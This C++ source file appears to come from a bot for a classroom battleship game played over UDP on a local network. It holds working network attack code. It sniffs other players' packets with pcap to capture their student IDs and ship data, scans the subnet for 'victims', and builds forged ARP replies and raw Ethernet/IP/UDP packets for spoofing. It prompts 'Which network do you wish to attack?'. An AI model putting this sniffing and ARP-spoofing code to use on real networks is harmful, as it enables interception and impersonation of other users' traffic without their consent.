/*
 * Copyright (c) 2017 The Hive Bot project authors. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file.
 */

/*
 * protocol_utils.cc - Protocol utils implementation.
 *
 * Provides a subset of protocol utilities for both the battleship bot and hive
 * bot protocols.
 */

#include "protocol_utils.h"

#include <iphlpapi.h>

#include <iostream>
#include <regex>
#include <sstream>
#include <thread>
#include <unordered_set>

#include "main.h"

namespace hive_bot {

pcap_t* pcap = NULL;
bool pcap_in_loop = false;
char pcap_error_buffer[PCAP_ERRBUF_SIZE];
char* our_mac = NULL;
char* server_mac = NULL;
std::unordered_map<char*, char*> ally_arp_table;
std::unordered_map<char*, char*> enemy_arp_table;
WORD last_server_tick;
std::vector<Ship> captured_ships;
std::unordered_map<char*, Ship> captured_student_ships;
std::unordered_map<char*, char*> captured_ids;
std::mutex packet_handler_mutex;

bool IsCapturedShip(Ship& ship) {
  for (Ship& captured : captured_ships) {
    if (captured == ship) {
      return true;
    }
  }
  return false;
}

bool IsCapturedStudentShip(Ship& ship) {
  int flag = ship.GetFlag() ^ '.';
  int difference_x = abs(flag - ship.GetX());

  if (difference_x < 3) {
    return true;
  }

  flag = ship.GetFlag() ^ 0x41;
  difference_x = abs(flag - ship.GetX());

  if (difference_x < 3) {
    return true;
  }

  for (auto& it : captured_student_ships) {
    if (ship == it.second) {
      return true;
    }
  }
  return false;
}

void PacketHandler(u_char *param, const struct pcap_pkthdr* header,
                   const u_char* pkt_data) {
  std::unique_lock<std::mutex> lock(packet_handler_mutex);
  int source_ip_offset = 26;
  u_char* source_ip_location = (u_char*) (pkt_data + source_ip_offset);
  std::stringstream parser;
  parser << (int) source_ip_location[0];

  for (size_t i = 1; i < 4; i++) {
    parser << '.' << (int) source_ip_location[i];
  }

  std::string source_ip = parser.str();

  if (source_ip == identity.GetIp()) {
    return;
  }

  int destination_port_offset = 36;
  u_char* destination_port_split = (u_char*)
                                   (pkt_data + destination_port_offset);
  u_short destination_port = (((u_short) (destination_port_split[0])) << 8 |
                                          destination_port_split[1]);
  int message_offset = sizeof(EthernetHeader) + sizeof(Ipv4Header) +
                       sizeof(UdpHeader);
  char* message = (char*) (pkt_data + message_offset);
  std::smatch match;
  const std::string str(message);

  if (destination_port == server_port) {
    static const std::regex client_pattern(
      "(Move|Flag|Fire|Register ) (([^,].)+),.*"
    );

    if (!std::regex_search(str.begin(), str.end(), match, client_pattern)) {
      return;
    }

    // std::cout << match[2] << " is at " << source_ip << std::endl;
    captured_ids.insert({
      strdup(source_ip.c_str()),
      strdup(match[2].str().c_str())
    });
  }

  if (destination_port != client_port || source_ip != server_ip) {
    return;
  }

  static const std::regex server_pattern("(\\d+,\\d+,\\d+,\\d+,\\d+(\\||))+");

  if (!std::regex_search(str.begin(), str.end(), match, server_pattern)) {
    return;
  }

  int destination_ip_offset = 30;
  u_char* destination_ip_location = (u_char*) (pkt_data +
                                               destination_ip_offset);
  parser.str(std::string());
  parser.clear();
  parser << (int) destination_ip_location[0];

  for (size_t i = 1; i < 4; i++) {
    parser << '.' << (int) destination_ip_location[i];
  }

  std::string destination_ip = parser.str();
  std::vector<Ship> ships = ReadShips(false, message);

  captured_student_ships.insert({
    strdup(destination_ip.c_str()),
    ships.at(0)
  });

  for (Ship& ship : ships) {
    if (!IsCapturedShip(ship)) {
      captured_ships.push_back(ship);
    }
  }
}

void WriteMac(char* input, u_char* output) {
  short* mac = (short*) output;

  for (int i = 0; i < 3; i++) {
    sscanf_s(input + (i * 4), "%4hx", mac + i);
    mac[i] = htons(mac[i]);
  }
}

void WriteEthernet(u_char* packet,
                   char* destination_mac,
                   char* source_mac,
                   u_short protocol) {
  struct EthernetHeader* header = (struct EthernetHeader*) packet;
  WriteMac(destination_mac, header->destination);
  WriteMac(source_mac, header->source);
  header->protocol = htons(protocol);
}

void WriteArp(u_char* packet,
              char* destination_mac,
              char* source_mac,
              char* sender_mac,
              char* target_mac,
              char* sender_ip,
              char* target_ip) {
  WriteEthernet(packet, destination_mac, source_mac, 0x0806);

  size_t header_offset = sizeof(EthernetHeader);
  struct ArpHeader* header = (struct ArpHeader*) (packet + header_offset);

  header->hardware_type = htons(0x0001);
  header->protocol_type = htons(0x0800);
  header->hardware_length = 6;
  header->protocol_length = 4;
  header->operation = htons(0x0002);
  WriteMac(sender_mac, header->sender_hardware_address);
  WriteMac(target_mac, header->target_hardware_address);
  *(IP*)header->sender_protocol_address = inet_addr(sender_ip);
  *(IP*)header->target_protocol_address = inet_addr(target_ip);
}

u_short Ipv4Checksum(void* packet, size_t length) {
  u_long checksum = 0;
  u_short* data = (u_short*)(packet);

  for (size_t i = 0; i < (length / 2); i++) {
    checksum += data[i];
  }

  while (checksum > 0xffff) {
    u_short carry = checksum >> 16;
    checksum &= 0xffff;
    checksum += carry;
  }

  return ~checksum;
}

void WriteIpv4(u_short length,
               u_char* packet,
               char* destination_mac,
               char* source_mac,
               char* sender_ip,
               char* target_ip,
               u_char protocol) {
  // Add IP header length to current packet length.
  length += sizeof(Ipv4Header);

  // Write the Ethernet header.
  WriteEthernet(packet, destination_mac, source_mac, 0x0800);

  size_t header_offset = sizeof(EthernetHeader);
  struct Ipv4Header* header = (struct Ipv4Header*) (packet + header_offset);

  header->version = 4; // IPv4
  header->header_length = 5;
  header->type_of_service = 0;
  header->total_length = htons(length);
  header->id = rand();
  header->flags = 0;
  header->time_to_live = 128;
  header->protocol = protocol;
  header->source_address = inet_addr(sender_ip);
  header->destination_address = inet_addr(target_ip);
  header->checksum = 0; // Zero checksum for calculation.

  // Calculate and set the checksum.
  u_short checksum = Ipv4Checksum(header, sizeof(Ipv4Header));
  header->checksum = checksum;
}

void WriteUdp(u_short length,
              u_char* packet,
              u_short source_port,
              u_short destination_port,
              char* destination_mac,
              char* source_mac,
              char* sender_ip,
              char* target_ip) {
  // Add UDP header length to current packet length.
  length += sizeof(struct UdpHeader);

  // Write the IP header.
  WriteIpv4(length, packet, destination_mac, source_mac, sender_ip, target_ip,
            0x11);

  // Get the UDP header memory location.
  size_t header_offset = sizeof(Ipv4Header) + sizeof(EthernetHeader);
  struct UdpHeader* header = (struct UdpHeader*) (packet + header_offset);

  // Write UDP header to memory (checksum not implemented).
  header->source_port = htons(source_port);
  header->destination_port = htons(destination_port);
  header->length = htons(length);
  header->checksum = 0;
}

bool IsAllyIp(std::string ip) {
  for (Student& ally : allies) {
    if (ally.GetIp() == ip) {
      return true;
    }
  }
  return false;
}

bool FetchMac(IP ip, MAC* mac) {
  IPAddr source = 0;
  u_long address_length = 6;
  SendARP(ip, source, mac, &address_length);
  return address_length == 0;
}

void FetchMacs(std::string c_network) {
  std::cout << std::endl << "Scanning network for victims..." << std::endl;

  IP ip_joined = inet_addr(c_network.c_str());
  u_char* ip = (u_char*) &ip_joined;
  ip[3] = 0;

  std::vector<std::thread> threads;
  MAC macs[256];
  memset(macs, '\0', sizeof(macs));

  for (int i = 0; i < 256; i++) {
    memcpy(&ip_joined, ip, sizeof(u_long));
    std::thread load_mac_thread(FetchMac, ip_joined, &macs[i]);
    threads.push_back(std::move(load_mac_thread));
    ip[3]++;
  }

  IP our_ip_joined = inet_addr(identity.GetIp().c_str());
  u_char* our_ip = (u_char*) &our_ip_joined;

  ip[3] = -1;

  for (std::thread& load_mac_thread : threads) {
    load_mac_thread.join();
  }

  std::cout << "Victims found: " << std::endl;

  for (int i = 0; i < 255; i++) {
    ip[3]++;

    if (macs[i] == 0 && i != our_ip[3]) {
      continue;
    }

    memcpy(&ip_joined, ip, sizeof(u_long));

    std::stringstream ip_string;
    std::stringstream mac_string;

    u_char* mac = (u_char*) &macs[i];
    ip_string << (int) ip[0];

    for (int i = 1; i < 4; i++) {
      ip_string << '.' << (int) ip[i];
    }

    mac_string << std::hex;

    if (mac[0] < 16) {
      mac_string << '0';
    }

    mac_string << (int) mac[0];

    for (int i = 1; i < 6; i++) {
      if (mac[i] < 16) {
        mac_string << '0';
      }
      mac_string << (int) mac[i];
    }

    if (((int) our_ip[3]) == i) {
      our_mac = strdup(mac_string.str().c_str());
      continue;
    }

    if (server_ip == ip_string.str()) {
      server_mac = strdup(mac_string.str().c_str());
    }

    if (IsAllyIp(ip_string.str())) {
      ally_arp_table.insert({
        strdup(ip_string.str().c_str()),
        strdup(mac_string.str().c_str())
      });
      continue;
    }

    std::cout << "- " << ip_string.str() << " @ " << mac_string.str();
    std::cout << std::endl << std::dec << std::endl;

    enemy_arp_table.insert({
      strdup(ip_string.str().c_str()),
      strdup(mac_string.str().c_str())
    });
  }

  threads.clear();
}

bool SelectDevice() {
  pcap_if_t *devices;

  if (pcap_findalldevs(&devices, pcap_error_buffer) == -1) {
    std::cout << "Could not open device list: " << pcap_error_buffer;
    std::cout << std::endl;
    return false;
  }

  if (!devices) {
    std::cout << "No devices found." << std::endl;
    return false;
  }

  int id = 0;

  std::cout << "Which network do you wish to attack?" << std::endl;

  for (pcap_if_t *device = devices; device; device = device->next) {
    std::cout << ++id << ") ";
    std::cout << (device->name);

    if (device->description != NULL) {
      std::cout << " (" << (device->description) << ")";
    }

    std::cout << std::endl;
  }

  int selected = 0;
  std::string message;

  while (selected < 1 || selected > id) {
    std::cout << std::endl << "Enter network ID (1-" << id << "): ";
    std::getline(std::cin, message);

    try {
      selected = std::stoi(message);
    } catch (std::invalid_argument& ignore) {
    }
  }

  char selected_device[128];
  id = 0;

  for (pcap_if_t *device = devices; device; device = device->next) {
    if (++id == selected) {
      memcpy(selected_device, device->name, strlen(device->name) + 1);
      break;
    }
  }

  pcap_freealldevs(devices);

	if (!(pcap = pcap_open_live(selected_device, 65535, 1, 20,
                              pcap_error_buffer))) {
    pcap = NULL;
		std::cout << "Could not open device " << selected_device << ": ";
    std::cout << pcap_error_buffer << std::endl;
		return false;
  }

  std::cout << "Successfully selected " << selected_device << std::endl;
  return true;
}

/**
 * Encrypts and decrypts a message using XOR encryption.
 *
 * @param message The message to encrypt.
 * @return the encrypted message.
 */
std::string XorEncrypt(std::string message) {
  // for (std::size_t i = 0; i < message.length(); i++) {
  //   message[i] ^= key[i % key.length()];
  // }
  return message;
}

/**
 * Reads in a tick packet.
 *
 * @param message The message to read.
 * @return the parsed tick packet.
 */
TickPacket ReadTickPacket(char* message) {
  int score;
  std::vector<Ship> ships;
  std::stringstream stream(XorEncrypt(message));

  int x;
  int y;
  int health;
  int flag;
  int type = 0;
  char separator;

  stream >> score >> separator;

  while (!stream.eof() && stream.good()) {
    stream >> x >> separator;
    stream >> y >> separator;
    stream >> health >> separator;
    stream >> flag >> separator;
    stream >> type >> separator;

    ships.push_back(Ship(x, y, health, flag, type));
  }

  return TickPacket(score, ships);
}

/**
 * Reads in a list of ships.
 *
 * @param convert Apply the correct ship type to the first ship.
 * @param message The message to read.
 * @return the parsed list of ships.
 */
std::vector<Ship> ReadShips(bool convert, char* message) {
  std::vector<Ship> ships;
  std::stringstream stream(message);

  int x;
  int y;
  int health;
  int flag;
  int type = 0;
  char separator;

  while (!stream.eof() && stream.good()) {
    stream >> x >> separator;
    stream >> y >> separator;
    stream >> health >> separator;
    stream >> flag >> separator;

    if (convert) {
      type = ship_type;
      convert = false;
    } else {
      stream >> type >> separator;
    }

    ships.push_back(Ship(x, y, health, flag, type));
  }

  return ships;
}

/**
 * Writes a fire packet.
 *
 * @param id The student ID.
 * @param x  The X coordinate to fire at.
 * @param y  The Y coordinate to fire at.
 * @return the fire packet.
 */
std::string WriteFire(std::string id, int x, int y) {
  std::stringstream message;
  message << "Fire " << id << ',' << x << ',' << y;
  return message.str();
}

/**
 * Writes a movement packet.
 *
 * @param id The student ID.
 * @param x  The X coordinate to fire at.
 * @param y  The Y coordinate to fire at.
 * @return the movement packet.
 */
std::string WriteMove(std::string id, int x, int y) {
  std::stringstream message;
  message << "Move " << id << ',' << x << ',' << y;
  return message.str();
}

/**
 * Writes a flag change packet.
 *
 * @param id   The student ID.
 * @param flag The new flag.
 * @return the flag change packet.
 */
std::string WriteFlag(std::string id, int flag) {
  std::stringstream message;
  message << "Flag " << id << ',' << flag;
  return message.str();
}

/**
 * Writes a respawn packet.
 *
 * @param id        The student ID.
 * @param forename  The student forename.
 * @param surname   The student surname.
 * @param ship_type The new ship type.
 * @return the respawn packet.
 */
std::string WriteRespawn(std::string id, std::string forename,
    std::string surname, int ship_type) {
  std::stringstream message;
  message << "Register  ";
  message << id << ',';
  message << forename << ',';
  message << surname << ',';
  message << ship_type;
  return message.str();
}

/**
 * Writes a tick packet.
 *
 * @param packet The packet to write.
 * @return the tick packet.
 */
std::string WriteTickPacket(TickPacket packet) {
  std::stringstream message;

  message << packet.GetScore() << '$';

  for (Ship& s : packet.GetShips()) {
    message << s.GetX() << ',';
    message << s.GetY() << ',';
    message << s.GetHealth() << ',';
    message << s.GetFlag() << ',';
    message << s.GetType() << '|';
  }

  std::string str = message.str();
  str.pop_back();
  return XorEncrypt(str);
}

/**
 * Writes a ships packet.
 *
 * @param ships The ships to write.
 * @return the ships packet.
 */
std::string WriteShips(std::vector<Ship> ships) {
  std::stringstream message;

  for (Ship& s : ships) {
    message << s.GetX() << ',';
    message << s.GetY() << ',';
    message << s.GetHealth() << ',';
    message << s.GetFlag() << ',';
    message << s.GetType() << '|';
  }

  std::string str = message.str();
  str.pop_back();
  return str;
}

} // namespace hive_bot
